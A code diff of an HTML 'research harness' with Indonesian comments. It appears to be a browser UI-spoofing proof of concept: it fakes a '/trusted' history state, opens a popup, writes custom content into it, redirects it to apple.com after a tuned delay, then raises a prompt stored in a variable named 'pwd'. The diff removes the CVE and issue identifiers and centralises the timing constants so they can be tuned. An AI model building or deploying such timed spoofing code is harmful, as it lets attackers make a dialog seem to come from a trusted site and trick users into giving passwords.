@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>CVE-2026-516836297 Research Harness</title>
+    <title>Advanced Lifecycle Research Harness - Optimized</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2em; background: #020617; color: #f8fafc; }
         .container { max-width: 800px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
@@ -19,32 +19,39 @@
 <body>
 
 <div class="container">
-    <h2>Issue  m </h2>
-    <span class="badge">Lifecycle & History State Management</span>
-    
+    <h2>Advanced Lifecycle Research Harness 350-700</h2>
+    <span class="badge">Precision Timing & State Management</span>
+
     <div id="panel">
         <strong>[Trusted State Panel Active]</strong><br>
         State history lokal berhasil diperbarui ke /trusted.
     </div>
 
-    <p>HarnesTs ini difokuskan pada pengujian perilaku manipulasi state history lokal, sinkronisasi lifecycle, dan manajemen transisi navigasi asinkron.</p>
-    
+    <p>Harness ini dilengkapi dengan kontrol parameter milidetik (ms) terpusat untuk menguji sinkronisasi transisi navigasi asinkron dan manajemen siklus hidup dokumen secara presisi.</p>
+
     <button class="btn" id="executeAllBtn">Jalankan Rangkaian Pengujian</button>
-    
+
     <div id="terminal">Status: Menunggu inisialisasi rangkaian...</div>
 </div>
 
 <script>
+// --- KONFIGURASI TIMING (MILISEKON / MS) ---
+const TIMING = {
+    NAV_DELAY_MS: 350,    // Jeda sebelum redirect eksternal dieksekusi di tab baru
+    PROMPT_DELAY_MS: 700  // Jeda eksekusi dialog prompt interaktif utama
+};
+
 function logTerm(msg) {
     var t = document.getElementById('terminal');
     if (t) {
-        t.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
+        var elapsed = (performance.now() / 1000).toFixed(2);
+        t.textContent += '\n[' + new Date().toLocaleTimeString() + ' | +' + elapsed + 's] ' + msg;
         t.scrollTop = t.scrollHeight;
     }
-    console.log('[Harness-516836297] ' + msg);
+    console.log('[ResearchHarness] ' + msg);
 }
 
-// Pemantauan Lifecycle Pageshow dengan kalibrasi rAF ganda
+// Pemantauan lifecycle pageshow dengan sinkronisasi frame
 window.addEventListener('pageshow', (event) => {
     logTerm('Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
     requestAnimationFrame(() => {
@@ -56,7 +63,7 @@ window.addEventListener('pageshow', (event) => {
 
 document.getElementById('executeAllBtn').onclick = async function() {
     this.style.display = 'none';
-    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI ISSUE 516836297 ===');
+    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI RISET ===');
 
     // 1. Manipulasi State Lokal & Panel Visual
     try {
@@ -67,7 +74,7 @@ document.getElementById('executeAllBtn').onclick = async function() {
         logTerm('[1/3] Error pushState: ' + err.message);
     }
 
-    // 2. Pengelolaan Jendela Popup dengan Sinkronisasi Dokumen Aman
+    // 2. Pengelolaan Jendela Popup dengan Injeksi Konten "Dhafy A"
     logTerm('[2/3] Menginisialisasi konteks popup asinkron...');
     try {
         const newTab = window.open("about:blank", "_blank");
@@ -75,29 +82,26 @@ document.getElementById('executeAllBtn').onclick = async function() {
             newTab.document.write(`
                 <!DOCTYPE html>
                 <html>
-                <head><title>Research Overlay - 516836297</title></head>
-                <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
-                  <div>
-                    <h1 style="font-size:42px;font-weight:bold;color:red;margin:0 0 20px 0">LIFECYCLE RESEARCH OVERLAY</h1>
-                    <p style="font-size:28px;font-weight:bold;color:#007aff;margin:10px 0">SYNC TIMING ACTIVE</p>
-                  </div>
+                <head><title>Research Overlay</title></head>
+                <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+                  <h1 style="font-size:72px;font-weight:bold;color:#1d1d1f;margin:0;">Dhafy A</h1>
                 </body>
                 </html>
             `);
             newTab.document.close();
-            logTerm('[2/3] Konten overlay berhasil dirender di tab baru.');
+            logTerm('[2/3] Konten overlay "Dhafy A" berhasil dirender di tab baru.');
 
-            // Menggunakan sinkronisasi rAF berlapis dan delay terkalibrasi sebelum navigasi eksternal
+            // Sinkronisasi frame ganda & penundaan terkalibrasi berbasis parameter TIMING
             newTab.requestAnimationFrame(() => {
                 newTab.requestAnimationFrame(() => {
                     setTimeout(() => {
                         try {
                             newTab.location.href = "https://apple.com";
-                            logTerm('[2/3] Navigasi eksternal ke apple.com dipicu pasca-render lock.');
+                            logTerm('[2/3] Navigasi eksternal ke apple.com dipicu setelah ' + TIMING.NAV_DELAY_MS + 'ms.');
                         } catch (navErr) {
                             logTerm('[2/3] Gagal memicu navigasi eksternal: ' + navErr.message);
                         }
-                    }, 380);
+                    }, TIMING.NAV_DELAY_MS);
                 });
             });
         } else {
@@ -107,16 +111,16 @@ document.getElementById('executeAllBtn').onclick = async function() {
         logTerm('[2/3] Error pada penanganan window.open: ' + e.message);
     }
 
-    // 3. Dialog Prompt Interaktif (Non-blocking)
+    // 3. Dialog Prompt Interaktif (Non-blocking flow) berbasis parameter TIMING
     setTimeout(function () {
         try {
-            logTerm('[3/3] Memanggil dialog input interaktif (prompt)...');
-            const pwd = prompt("ROOT CAUSE ANALYSIS - ISSUE 516836297");
+            logTerm('[3/3] Memanggil dialog input interaktif (prompt) setelah ' + TIMING.PROMPT_DELAY_MS + 'ms...');
+            const pwd = prompt("ROOT CAUSE ANALYSIS - RESEARCH HARNESS");
             logTerm('[3/3] Dialog prompt selesai diproses.');
         } catch (err) {
             logTerm('[3/3] Prompt dilewati atau diblokir.');
         }
-    }, 794);
+    }, TIMING.PROMPT_DELAY_MS);
 };
 </script>
 
